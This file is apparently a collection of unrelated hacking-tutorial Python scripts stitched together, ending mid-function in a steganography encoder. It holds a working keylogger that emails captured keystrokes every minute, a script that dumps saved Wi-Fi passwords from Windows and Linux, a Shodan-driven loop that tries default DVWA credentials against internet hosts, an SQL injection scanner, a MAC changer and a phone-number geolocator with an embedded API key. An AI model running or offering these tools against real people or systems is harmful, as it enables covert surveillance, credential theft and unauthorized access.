            'Email': fake.free_email(),
            'Phone Number': fake.phone_number(),
            'Birthdate': fake.date_of_birth(),
            'Address': fake.address(),
            'City': fake.city(),
            'Country': fake.country(),
            'ZIP Code': fake.zipcode(),
            'Job Title': fake.job(),
            'Company': fake.company(),
            'IP Address': fake.ipv4_private(),
            'Credit Card Number': fake.credit_card_number(),
            'Username': fake.user_name(),
            'Website': fake.url(),
            'SSN': fake.ssn()
        }
        # Append the user data dictionary to the user_data list.
        user_data.append(user)

    # Return the list of generated user data.
    return user_data


# Function to save user data to a CSV file.
def save_to_csv(data, filename):
    # Get the keys (column names) from the first dictionary in the data list.
    keys = data[0].keys()
    # Open the CSV file for writing.
    with open(filename, 'w', newline='') as output_file:
        # Create a CSV writer with the specified column names.
        writer = csv.DictWriter(output_file, fieldnames=keys)
        # Write the header row to the CSV file.
        writer.writeheader()
        # Iterate through each user dictionary and write a row to the CSV file.
        for user in data:
            writer.writerow(user)
    # Print a success message indicating that the data has been saved to the file.
    print(f'[+] Data saved to {filename} successfully.')


# Function to save user data to a text file.
def save_to_text(data, filename):
    # Open the text file for writing.
    with open(filename, 'w') as output_file:
        # Iterate through each user dictionary.
        for user in data:
            # Iterate through key-value pairs in the user dictionary and write to the text file.
            for key, value in user.items():
                output_file.write(f"{key}: {value}\n")
            # Add a newline between users in the text file.
            output_file.write('\n')
    # Print a success message indicating that the data has been saved to the file.
    print(f'[+] Data saved to {filename} successfully.')


# Function to print user data vertically.
def print_data_vertically(data):
    # Iterate through each user dictionary in the data list.
    for user in data:
        # Iterate through key-value pairs in the user dictionary and print vertically.
        for key, value in user.items():
            print(f"{key}: {value}")
        # Add a newline between users.
        print()


# Get the number of users from user input.
number_of_users = int(input("[!] Enter the number of users to generate: "))
# Generate user data using the specified number of users.
user_data = generate_user_data(number_of_users)

# Ask the user if they want to save the data to a file.
save_option = input("[?] Do you want to save the data to a file? (yes/no): ").lower()

# If the user chooses to save the data.
if save_option == 'yes':
    # Ask the user for the file type (CSV, TXT, or both).
    file_type = input("[!] Enter file type (csv/txt/both): ").lower()

    # Save to CSV if the user chose CSV or both.
    if file_type == 'csv' or file_type == 'both':
        # Ask the user for the CSV filename.
        custom_filename_csv = input("[!] Enter the CSV filename (without extension): ")
        # Concatenate the filename with the .csv extension.
        filename_csv = f"{custom_filename_csv}.csv"
        # Call the save_to_csv function to save the data to the CSV file.
        save_to_csv(user_data, filename_csv)

    # Save to TXT if the user chose TXT or both.
    if file_type == 'txt' or file_type == 'both':
        # Ask the user for the TXT filename.
        custom_filename_txt = input("[!] Enter the TXT filename (without extension): ")
        # Concatenate the filename with the .txt extension.
        filename_txt = f"{custom_filename_txt}.txt"
        # Call the save_to_text function to save the data to the text file.
        save_to_text(user_data, filename_txt)

    # If the user entered an invalid file type.
    if file_type not in ['csv', 'txt', 'both']:
        # Print an error message indicating that the file type is invalid.
        print("[-] Invalid file type. Data not saved.")
# If the user chose not to save the data, print it vertically.
else:
    # Call the print_data_vertically function to print the data vertically.
    print_data_vertically(user_data)

import subprocess
import os
import re
from collections import namedtuple
import configparser


def get_windows_saved_ssids():
    """Returns a list of saved SSIDs in a Windows machine using netsh command"""
    # get all saved profiles in the PC
    output = subprocess.check_output("netsh wlan show profiles").decode()
    ssids = []
    profiles = re.findall(r"All User Profile\s(.*)", output)
    for profile in profiles:
        # for each SSID, remove spaces and colon
        ssid = profile.strip().strip(":").strip()
        # add to the list
        ssids.append(ssid)
    return ssids


def get_windows_saved_wifi_passwords(verbose=1):
    """Extracts saved Wi-Fi passwords saved in a Windows machine, this function extracts data using netsh
    command in Windows
    Args:
        verbose (int, optional): whether to print saved profiles real-time. Defaults to 1.
    Returns:
        [list]: list of extracted profiles, a profile has the fields ["ssid", "ciphers", "key"]
    """
    ssids = get_windows_saved_ssids()
    Profile = namedtuple("Profile", ["ssid", "ciphers", "key"])
    profiles = []
    for ssid in ssids:
        ssid_details = subprocess.check_output(f"""netsh wlan show profile "{ssid}" key=clear""").decode()
        # get the ciphers
        ciphers = re.findall(r"Cipher\s(.*)", ssid_details)
        # clear spaces and colon
        ciphers = "/".join([c.strip().strip(":").strip() for c in ciphers])
        # get the Wi-Fi password
        key = re.findall(r"Key Content\s(.*)", ssid_details)
        # clear spaces and colon
        try:
            key = key[0].strip().strip(":").strip()
        except IndexError:
            key = "None"
        profile = Profile(ssid=ssid, ciphers=ciphers, key=key)
        if verbose >= 1:
            print_windows_profile(profile)
        profiles.append(profile)
    return profiles


def print_windows_profile(profile):
    """Prints a single profile on Windows"""
    print(f"{profile.ssid:25}{profile.ciphers:15}{profile.key:50}")


def print_windows_profiles(verbose):
    """Prints all extracted SSIDs along with Key on Windows"""
    print("SSID                     CIPHER(S)      KEY")
    print("-" * 50)
    get_windows_saved_wifi_passwords(verbose)


def get_linux_saved_wifi_passwords(verbose=1):
    """Extracts saved Wi-Fi passwords saved in a Linux machine, this function extracts data in the
    `/etc/NetworkManager/system-connections/` directory
    Args:
        verbose (int, optional): whether to print saved profiles real-time. Defaults to 1.
    Returns:
        [list]: list of extracted profiles, a profile has the fields ["ssid", "auth-alg", "key-mgmt", "psk"]
    """
    network_connections_path = "/etc/NetworkManager/system-connections/"
    fields = ["ssid", "auth-alg", "key-mgmt", "psk"]
    Profile = namedtuple("Profile", [f.replace("-", "_") for f in fields])
    profiles = []
    for file in os.listdir(network_connections_path):
        data = {k.replace("-", "_"): None for k in fields}
        config = configparser.ConfigParser()
        config.read(os.path.join(network_connections_path, file))
        for _, section in config.items():
            for k, v in section.items():
                if k in fields:
                    data[k.replace("-", "_")] = v
        profile = Profile(**data)
        if verbose >= 1:
            print_linux_profile(profile)
        profiles.append(profile)
    return profiles


def print_linux_profile(profile):
    """Prints a single profile on Linux"""
    print(f"{str(profile.ssid):25}{str(profile.auth_alg):5}{str(profile.key_mgmt):10}{str(profile.psk):50}")


def print_linux_profiles(verbose):
    """Prints all extracted SSIDs along with Key (PSK) on Linux"""
    print("SSID                     AUTH KEY-MGMT  PSK")
    print("-" * 50)
    get_linux_saved_wifi_passwords(verbose)


def print_profiles(verbose=1):
    if os.name == "nt":
        print_windows_profiles(verbose)
    elif os.name == "posix":
        print_linux_profiles(verbose)
    else:
        raise NotImplemented("Code only works for either Linux or Windows")


# Import sys for system operations and colorama for colored output.
import sys
from colorama import init, Fore

# Initialise colorama
init()


# Function to Encrypt using the Vigenère cipher.
def vigenere_encrypt(plain_text, key):
    encrypted_text = ''

    # Repeat the key to match the length of the plaintext.
    key_repeated = (key * (len(plain_text) // len(key))) + key[:len(plain_text) % len(key)]

    # Iterate through each character in the plaintext.
    for i in range(len(plain_text)):
        # Check if the character is an alphabet letter.
        if plain_text[i].isalpha():
            # Calculate the shift based on the corresponding key letter.
            shift = ord(key_repeated[i].upper()) - ord('A')

            # Encrypt uppercase and lowercase letters separately.
            if plain_text[i].isupper():
                encrypted_text += chr((ord(plain_text[i]) + shift - ord('A')) % 26 + ord('A'))
            else:
                encrypted_text += chr((ord(plain_text[i]) + shift - ord('a')) % 26 + ord('a'))
        else:
            # If the character is not an alphabet letter, keep it unchanged.
            encrypted_text += plain_text[i]

    # Return the final encrypted text
    return encrypted_text


# Decryption function for the Vigenère cipher
def vigenere_decrypt(cipher_text, key):
    decrypted_text = ''

    # Repeat the key to match the length of the ciphertext
    key_repeated = (key * (len(cipher_text) // len(key))) + key[:len(cipher_text) % len(key)]

    # Iterate through each character in the ciphertext
    for i in range(len(cipher_text)):
        # Check if the character is an alphabet letter
        if cipher_text[i].isalpha():
            # Calculate the shift based on the corresponding key letter
            shift = ord(key_repeated[i].upper()) - ord('A')

            # Decrypt uppercase and lowercase letters separately
            if cipher_text[i].isupper():
                decrypted_text += chr((ord(cipher_text[i]) - shift - ord('A')) % 26 + ord('A'))
            else:
                decrypted_text += chr((ord(cipher_text[i]) - shift - ord('a')) % 26 + ord('a'))
        else:
            # If the character is not an alphabet letter, keep it unchanged
            decrypted_text += cipher_text[i]

    # Return the final decrypted text
    return decrypted_text


key = "KEY"
# Get user input (Message to encrypt).
plaintext = input('[!] Enter your message: ')

# Encrypt the plaintext using the Vigenère cipher
cipher_text = vigenere_encrypt(plaintext, key)

# Print the results
print(f"[+] Plaintext: {plaintext}")
print(f"{Fore.GREEN}[+] Ciphertext: {cipher_text}")

# Ask if user wants to decrypt the message (just to see the functionality.)
ask_to_decrypt = input('\n\n[?] Do you want to decrypt the message?\n[?] Y or N: ').lower()

# If user wants to.
if ask_to_decrypt == 'y':
    # Decrypt the ciphertext back to the original plaintext.
    decrypted_text = vigenere_decrypt(cipher_text, key)
    print(f"{Fore.GREEN}[+] Decrypted text: {decrypted_text}")

# If user does not want to.
elif ask_to_decrypt == 'n':
    sys.exit()
# When an invalid input is entered.
else:
    print(f"{Fore.RED}[-] Invalid input.")

import keyboard  # for keylogs
import smtplib  # for sending email using SMTP protocol (gmail)
# Timer is to make a method runs after an `interval` amount of time
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

SEND_REPORT_EVERY = 60  # in seconds, 60 means 1 minute and so on
EMAIL_ADDRESS = "email@provider.tld"
EMAIL_PASSWORD = "password_here"


class Keylogger:
    def __init__(self, interval, report_method="email"):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        self.report_method = report_method
        # this is the string variable that contains the log of all
        # the keystrokes within `self.interval`
        self.log = ""
        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # finally, add the key name to our global `self.log` variable
        self.log += name

    def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
        # open the file in write mode (create it)
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def prepare_mail(self, message):
        """Utility function to construct a MIMEMultipart from a text
        It creates an HTML version as well as text version
        to be sent as an email"""
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger logs"
        # simple paragraph, feel free to edit
        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)
        # after making the mail, convert back as string message
        return msg.as_string()

    def sendmail(self, email, password, message, verbose=1):
        # manages a connection to an SMTP server
        # in our case it's for Microsoft365, Outlook, Hotmail, and live.com
        server = smtplib.SMTP(host="smtp.office365.com", port=587)
        # connect to the SMTP server as TLS mode ( for security )
        server.starttls()
        # login to the email account
        server.login(email, password)
        # send the actual message after preparation
        server.sendmail(email, email, self.prepare_mail(message))
        # terminates the session
        server.quit()
        if verbose:
            print(f"{datetime.now()} - Sent an email to {email} containing:  {message}")

    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            # update `self.filename`
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
                # if you don't want to print in the console, comment below line
                print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # make a simple message
        print(f"{datetime.now()} - Started keylogger")
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()




import subprocess, platform, re
from colorama import init, Fore

init()


def list_open_networks():
    # Get the name of the operating system.
    os_name = platform.system()

    # Check if the OS is Windows.
    if os_name == "Windows":
        # Command to list Wi-Fi networks on Windows.
        list_networks_command = 'netsh wlan show networks'
        try:
            # Execute the command and capture the output.
            output = subprocess.check_output(list_networks_command, shell=True, text=True)
            networks = []

            # Parse the output to find open Wi-Fi networks.
            for line in output.splitlines():
                if "SSID" in line:
                    # Extract the SSID (Wi-Fi network name).
                    ssid = line.split(":")[1].strip()
                elif "Authentication" in line and "Open" in line:
                    # Check if the Wi-Fi network has open authentication.
                    networks.append(ssid)

            # Check if any open networks were found.
            if len(networks) > 0:
                # Print a message for open networks with colored output.
                print(f'{Fore.LIGHTMAGENTA_EX}[+] Open Wifi networks in range: \n')
                for each_network in networks:
                    print(f"{Fore.GREEN}[+] {each_network}")
            else:
                # Print a message if no open networks were found.
                print(f"{Fore.RED}[-] No open wifi networks in range")

        except subprocess.CalledProcessError as e:
            # Handle any errors that occur during the execution of the command.
            print(f"{Fore.RED}Error: {e}")
            # Return an empty list to indicate that no networks were found.
            return []

    elif os_name == "Linux":
        try:
            # Run nmcli to list available Wi-Fi networks.
            result = subprocess.run(["nmcli", "--fields", "SECURITY,SSID", "device", "wifi", "list"],
                                    stdout=subprocess.PIPE,
                                    text=True, check=True)

            # Access the captured stdout.
            output = result.stdout.strip()

            # Define a regex pattern to capture SSID and Security.
            pattern = re.compile(r'^(?P<security>[^\s]+)\s+(?P<ssid>.+)$', re.MULTILINE)

            # Find all matches in the output.
            matches = pattern.finditer(output)

            # Skip the first match, which is the header.
            next(matches, None)
            print(f"{Fore.LIGHTMAGENTA_EX}[+] Open Wifi networks in range: \n")
            # Loop through all matches (results)
            for match in matches:
                security = match.group('security')
                ssid = match.group('ssid')
                full_match = f"{Fore.GREEN}[+] SSID: {ssid} -------> Security: {security}"
                # Check if the indicator of an open network in our Full match (result).
                if "Security: --" in full_match:
                    print(f"{Fore.GREEN}[+] {ssid}")
                else:
                    print(f"{Fore.RED}[-] No open Wifi networks in range.")

        except subprocess.CalledProcessError as e:
            print(f"Error running nmcli: {e}")
        except Exception as e:
            print(f"An error occurred: {e}")

    else:
        print(f"{Fore.RED}Unsupported operating system.")
        return []


# Call the function.
list_open_networks()

import subprocess
import regex as re
import string
import random

# the registry path of network interfaces
network_interface_reg_path = r"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e972-e325-11ce-bfc1-08002be10318}"
# the transport name regular expression, looks like {AF1B45DB-B5D4-46D0-B4EA-3E18FA49BF5F}
transport_name_regex = re.compile("{.+}")
# the MAC address regular expression
mac_address_regex = re.compile(r"([A-Z0-9]{2}[:-]){5}([A-Z0-9]{2})")


def get_random_mac_address():
    """Generate and return a MAC address in the format of WINDOWS"""
    # get the hexdigits uppercased
    uppercased_hexdigits = ''.join(set(string.hexdigits.upper()))
    # 2nd character must be 2, 4, A, or E
    return random.choice(uppercased_hexdigits) + random.choice("24AE") + "".join(
        random.sample(uppercased_hexdigits, k=10))


def clean_mac(mac):
    """Simple function to clean non hexadecimal characters from a MAC address
    mostly used to remove '-' and ':' from MAC addresses and also uppercase it"""
    return "".join(c for c in mac if c in string.hexdigits).upper()


def get_connected_adapters_mac_address():
    # make a list to collect connected adapter's MAC addresses along with the transport name
    connected_adapters_mac = []
    # use the getmac command to extract
    for potential_mac in subprocess.check_output("getmac").decode().splitlines():
        # parse the MAC address from the line
        mac_address = mac_address_regex.search(potential_mac)
        # parse the transport name from the line
        transport_name = transport_name_regex.search(potential_mac)
        if mac_address and transport_name:
            # if a MAC and transport name are found, add them to our list
            connected_adapters_mac.append((mac_address.group(), transport_name.group()))
    return connected_adapters_mac


def get_user_adapter_choice(connected_adapters_mac):
    # print the available adapters
    for i, option in enumerate(connected_adapters_mac):
        print(f"#{i}: {option[0]}, {option[1]}")
    if len(connected_adapters_mac) <= 1:
        # when there is only one adapter, choose it immediately
        return connected_adapters_mac[0]
    # prompt the user to choose a network adapter index
    try:
        choice = int(input("Please choose the interface you want to change the MAC address:"))
        # return the target chosen adapter's MAC and transport name that we'll use later to search for our adapter
        # using the reg QUERY command
        return connected_adapters_mac[choice]
    except:
        # if -for whatever reason- an error is raised, just quit the script
        print("Not a valid choice, quitting...")
        exit()


def change_mac_address(adapter_transport_name, new_mac_address):
    # use reg QUERY command to get available adapters from the registry
    output = subprocess.check_output(f"reg QUERY " + network_interface_reg_path.replace("\\\\", "\\")).decode()
    for interface in re.findall(rf"{network_interface_reg_path}\\\d+", output):
        # get the adapter index
        adapter_index = int(interface.split("\\")[-1])
        interface_content = subprocess.check_output(f"reg QUERY {interface.strip()}").decode()
        if adapter_transport_name in interface_content:
            # if the transport name of the adapter is found on the output of the reg QUERY command
            # then this is the adapter we're looking for
            # change the MAC address using reg ADD command
            changing_mac_output = subprocess.check_output(
                f"reg add {interface} /v NetworkAddress /d {new_mac_address} /f").decode()
            # print the command output
            print(changing_mac_output)
            # break out of the loop as we're done
            break
    # return the index of the changed adapter's MAC address
    return adapter_index


def disable_adapter(adapter_index):
    # use wmic command to disable our adapter so the MAC address change is reflected
    disable_output = subprocess.check_output(
        f"wmic path win32_networkadapter where index={adapter_index} call disable").decode()
    return disable_output


def enable_adapter(adapter_index):
    # use wmic command to enable our adapter so the MAC address change is reflected
    enable_output = subprocess.check_output(
        f"wmic path win32_networkadapter where index={adapter_index} call enable").decode()
    return enable_output


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Python Windows MAC changer")
    parser.add_argument("-r", "--random", action="store_true", help="Whether to generate a random MAC address")
    parser.add_argument("-m", "--mac", help="The new MAC you want to change to")
    args = parser.parse_args()
    if args.random:
        # if random parameter is set, generate a random MAC
        new_mac_address = get_random_mac_address()
    elif args.mac:
        # if mac is set, use it after cleaning
        new_mac_address = clean_mac(args.mac)

    connected_adapters_mac = get_connected_adapters_mac_address()
    old_mac_address, target_transport_name = get_user_adapter_choice(connected_adapters_mac)
    print("[*] Old MAC address:", old_mac_address)
    adapter_index = change_mac_address(target_transport_name, new_mac_address)
    print("[+] Changed to:", new_mac_address)
    disable_adapter(adapter_index)
    print("[+] Adapter is disabled")
    enable_adapter(adapter_index)
    print("[+] Adapter is enabled again")



import phonenumbers, sys, folium, os, argparse
from colorama import init, Fore
from phonenumbers import geocoder, timezone, carrier
init()


def process_number(number):
    try:
        global location

        # Parse the phone number. See this as extracting relevant information from the Phone number.
        parsed_number = phonenumbers.parse(number)

        '''Display a message indicating the tracking attempt. We'll also format the parsed number to the 
        international format.'''

        print(f"{Fore.GREEN}[+] Attempting to track location of "
              f"{phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.INTERNATIONAL)}..")

        # Get and display the time zone ID
        print(f"{Fore.GREEN}[+] Time Zone ID: {timezone.time_zones_for_number(parsed_number)}")

        # Get the geographic location of the Phone number and display it.
        location = geocoder.description_for_number(parsed_number, "en")
        if location:
            print(f"{Fore.GREEN}[+] Region: {location}")
        else:
            print(f"{Fore.RED}[-] Region: Unknown")

        '''Get the service provider (carrier) and display it if available. Some businesses and 
        organizations do not use public service providers. So you may not see the carrier in that case.'''

        if carrier.name_for_number(parsed_number, 'en'):
            print(f"{Fore.GREEN}[+] Service Provider:  {carrier.name_for_number(parsed_number, 'en')}")
        else:
            pass

    # Handle exceptions, such as invalid phone numbers or connectivity issues.
    except Exception:
        print(f"{Fore.RED}[-] Please specify a valid phone number (with country code)"
              " or check your internet connection.")
        sys.exit()

def get_approx_coordinates():
    # Import the OpenCageGeocode class from the opencage.geocoder module
    from opencage.geocoder import OpenCageGeocode

    global coder, latitude, longitude

    # Try to execute the following block, and handle exceptions if they occur.
    try:
        # Create an instance of the OpenCageGeocode class with your API key.
        coder = OpenCageGeocode("42c84373c47e490ba410d4132ae64fc4")

        query = location

        # Perform a geocoding query to obtain results.
        results = coder.geocode(query)

        # Extract latitude and longitude from the geocoding results. These are the coordinates of the number's location.
        latitude = results[0]['geometry']['lat']
        longitude = results[0]['geometry']['lng']

        # Print the obtained latitude and longitude.
        print(f"[+] Latitude: {latitude}, Longitude: {longitude}")

        # Perform a reverse geocoding query to obtain an address based on coordinates.
        address = coder.reverse_geocode(latitude, longitude)

        # Check if an address was found.
        if address:
            address = address[0]['formatted']
            print(f"{Fore.LIGHTRED_EX}[+] Approximate Location is {address}")
        else:
            # If no address was found, print an error message.
            print(f"{Fore.RED}[-] No address found for the given coordinates.")
    except Exception:
        '''Handle exceptions by printing an error message and exiting the script. This would prevent the program from 
        crashing'''

        print(f"{Fore.RED}[-] Could not get the location of this number. Please specify a valid phone number or "
              "check your internet connection.")
        sys.exit()

# This function basically removes unwanted characters from the Phone number such as white spaces.
def clean_phone_number(phone_number):
    cleaned = ''.join(char for part in phone_number for char in part if char.isdigit() or char == '+')
    return cleaned or "unknown"

# Function to see Aerial view of the person's location.
def draw_map():
    try:
        # Create a Folium map centered around the latitude and longitude of the number's coordinates.
        my_map = folium.Map(location=[latitude, longitude], zoom_start=9)

        # Add a marker to the map at the specified latitude and longitude with a popup displaying the 'location' variable.
        folium.Marker([latitude, longitude], popup=location).add_to(my_map)

        ''' Clean the phone number and use it to generate a file name with an '.html' extension
        we'll basically save each map with the number of the owner for easy identification.'''

        cleaned_phone_number = clean_phone_number(args.phone_number) # We'll see 'args' soon.
        file_name = f"{cleaned_phone_number}.html"

        # Save the map as an HTML file with the generated file name.
        my_map.save(file_name)

        # Print a message indicating where the saved HTML file can be found.
        print(f"[+] See Aerial Coverage at: {os.path.abspath(file_name)}")

    # Handle the 'NameError' exception, which can occur if the 'latitude' or 'longitude' variables are not defined.
    except NameError:
        print(f"{Fore.RED}[-] Could not get Aerial coverage for this number. Please check the number again.")


# Function to handle command-line arguments.
def cli_argument():
    # Create an ArgumentParser object and specify a description.
    parser = argparse.ArgumentParser(description="Get approximate location of a Phone number.")

    # Define a command-line argument: -p or --phone. This is to receive the user's number from terminal.
    parser.add_argument("-p", "--phone", dest="phone_number", type=str,
                        help="Phone number to track. Please include the country code when specifying the number.",
                        required=True, nargs="+")

    # Parse the command-line arguments.
    argument = parser.parse_args()

    # Check if the 'phone_number' argument is not provided.
    if not argument.phone_number:
        # Print an error message indicating that the phone number is required.
        print(f"{Fore.RED}[-] Please specify the phone number to track (including country code)."
              " Use --help to see usage.")

        # Exit the script.
        sys.exit()

    # Return the parsed command-line arguments.
    return argument

# Parse command-line arguments using the 'cli_argument' function.
args = cli_argument()

# Call the process_number function and pass the phone number as a single string.
process_number("".join(args.phone_number))
get_approx_coordinates()
draw_map()


import shodan
import time
import requests
import re

# your shodan API key
SHODAN_API_KEY = '<YOUR_SHODAN_API_KEY_HERE>'
api = shodan.Shodan(SHODAN_API_KEY)

# requests a page of data from shodan
def request_page_from_shodan(query, page=1):
    while True:
        try:
            instances = api.search(query, page=page)
            return instances
        except shodan.APIError as e:
            print(f"Error: {e}")
            time.sleep(5)


# Try the default credentials on a given instance of DVWA, simulating a real user trying the credentials
# visits the login.php page to get the CSRF token, and tries to login with admin:password
def has_valid_credentials(instance):
    sess = requests.Session()
    proto = ('ssl' in instance) and 'https' or 'http'
    try:
        res = sess.get(f"{proto}://{instance['ip_str']}:{instance['port']}/login.php", verify=False)
    except requests.exceptions.ConnectionError:
        return False
    if res.status_code != 200:
        print(f"[-] Got HTTP status code {res.status_code}, expected 200")
        return False
    # search the CSRF token using regex
    token = re.search(r"user_token' value='([0-9a-f]+)'", res.text).group(1)
    res = sess.post(
        f"{proto}://{instance['ip_str']}:{instance['port']}/login.php",
        f"username=admin&password=password&user_token={token}&Login=Login",
        allow_redirects=False,
        verify=False,
        headers={'Content-Type': 'application/x-www-form-urlencoded'}
    )
    if res.status_code == 302 and res.headers['Location'] == 'index.php':
        # Redirects to index.php, we expect an authentication success
        return True
    else:
        return False

# Takes a page of results, and scans each of them, running has_valid_credentials
def process_page(page):
    result = []
    for instance in page['matches']:
        if has_valid_credentials(instance):
            print(f"[+] valid credentials at : {instance['ip_str']}:{instance['port']}")
            result.append(instance)
    return result

# searches on shodan using the given query, and iterates over each page of the results
def query_shodan(query):
    print("[*] querying the first page")
    first_page = request_page_from_shodan(query)
    total = first_page['total']
    already_processed = len(first_page['matches'])
    result = process_page(first_page)
    page = 2
    while already_processed < total:
        # break just in your testing, API queries have monthly limits
        break
        print("querying page {page}")
        page = request_page_from_shodan(query, page=page)
        already_processed += len(page['matches'])
        result += process_page(page)
        page += 1
    return result

# search for DVWA instances
res = query_shodan('title:dvwa')
print(res)


import requests
# import re # uncomment this for DVWA
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin
from pprint import pprint

s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"

# below code is for logging to your local DVWA
# uncomment it if you want to use this on DVWA
# login_payload = {
#     "username": "admin",
#     "password": "password",
#     "Login": "Login",
# }
# # change URL to the login page of your DVWA login URL
# login_url = "http://localhost:8080/DVWA-master/login.php"

# # login
# r = s.get(login_url)
# token = re.search("user_token'\s*value='(.*?)'", r.text).group(1)
# login_payload['user_token'] = token
# s.post(login_url, data=login_payload)


def get_all_forms(url):
    """Given a `url`, it returns all forms from the HTML content"""
    soup = bs(s.get(url).content, "html.parser")
    return soup.find_all("form")


def get_form_details(form):
    """
    This function extracts all possible useful information about an HTML `form`
    """
    details = {}
    # get the form action (target url)
    try:
        action = form.attrs.get("action").lower()
    except:
        action = None
    # get the form method (POST, GET, etc.)
    method = form.attrs.get("method", "get").lower()
    # get all the input details such as type and name
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({"type": input_type, "name": input_name, "value": input_value})
    # put everything to the resulting dictionary
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details


def is_vulnerable(response):
    """A simple boolean function that determines whether a page
    is SQL Injection vulnerable from its `response`"""
    errors = {
        # MySQL
        "you have an error in your sql syntax;",
        "warning: mysql",
        # SQL Server
        "unclosed quotation mark after the character string",
        # Oracle
        "quoted string not properly terminated",
    }
    for error in errors:
        # if you find one of these errors, return True
        if error in response.content.decode().lower():
            return True
    # no error detected
    return False


def scan_sql_injection(url):
    # test on URL
    for c in "\"'":
        # add quote/double quote character to the URL
        new_url = f"{url}{c}"
        print("[!] Trying", new_url)
        # make the HTTP request
        res = s.get(new_url)
        if is_vulnerable(res):
            # SQL Injection detected on the URL itself,
            # no need to preceed for extracting forms and submitting them
            print("[+] SQL Injection vulnerability detected, link:", new_url)
            return
    # test on HTML forms
    forms = get_all_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.")
    for form in forms:
        form_details = get_form_details(form)
        for c in "\"'":
            # the data body we want to submit
            data = {}
            for input_tag in form_details["inputs"]:
                if input_tag["value"] or input_tag["type"] == "hidden":
                    # any input form that has some value or hidden,
                    # just use it in the form body
                    try:
                        data[input_tag["name"]] = input_tag["value"] + c
                    except:
                        pass
                elif input_tag["type"] != "submit":
                    # all others except submit, use some junk data with special character
                    data[input_tag["name"]] = f"test{c}"
            # join the url with the action (form request URL)
            url = urljoin(url, form_details["action"])
            if form_details["method"] == "post":
                res = s.post(url, data=data)
            elif form_details["method"] == "get":
                res = s.get(url, params=data)
            # test whether the resulting page is vulnerable
            if is_vulnerable(res):
                print("[+] SQL Injection vulnerability detected, link:", url)
                print("[+] Form:")
                pprint(form_details)
                break


import cv2
import numpy as np
import os


def to_bin(data):
    """Convert `data` to binary format as string"""
    if isinstance(data, str):
        return ''.join([format(ord(i), "08b") for i in data])
    elif isinstance(data, bytes):
        return ''.join([format(i, "08b") for i in data])
    elif isinstance(data, np.ndarray):
        return [format(i, "08b") for i in data]
    elif isinstance(data, int) or isinstance(data, np.uint8):
        return format(data, "08b")
    else:
        raise TypeError("Type not supported.")


def encode(image_name, secret_data, n_bits=2):
    # read the image
    image = cv2.imread(image_name)
    # maximum bytes to encode
    n_bytes = image.shape[0] * image.shape[1] * 3 * n_bits // 8
    print("[*] Maximum bytes to encode:", n_bytes)
    print("[*] Data size:", len(secret_data))
    if len(secret_data) > n_bytes:
        raise ValueError(f"[!] Insufficient bytes ({len(secret_data)}), need bigger image or less data.")
    print("[*] Encoding data...")
    # add stopping criteria
    if isinstance(secret_data, str):
        secret_data += "====="
    elif isinstance(secret_data, bytes):
        secret_data += b"====="
    data_index = 0
    # convert data to binary
    binary_secret_data = to_bin(secret_data)
    # size of data to hide
    data_len = len(binary_secret_data)
    for bit in range(1, n_bits + 1):
        for row in image:
            for pixel in row:
                # convert RGB values to binary format
                r, g, b = to_bin(pixel)
                # modify the least significant bit only if there is still data to store
                if data_index < data_len:
                    if bit == 1:
                        # least significant red pixel bit
                        pixel[0] = int(r[:-bit] + binary_secret_data[data_index], 2)
                    elif bit > 1:
                        # replace the `bit` least significant bit of the red pixel with the data bit
                        pixel[0] = int(r[:-bit] + binary_secret_data[data_index] + r[-bit + 1:], 2)
                    data_index += 1
                if data_index < data_len:
                    if bit == 1:
                        # least significant green pixel bit
                        pixel[1] = int(g[:-bit] + binary_secret_data[data_index], 2)
                    elif bit > 1:
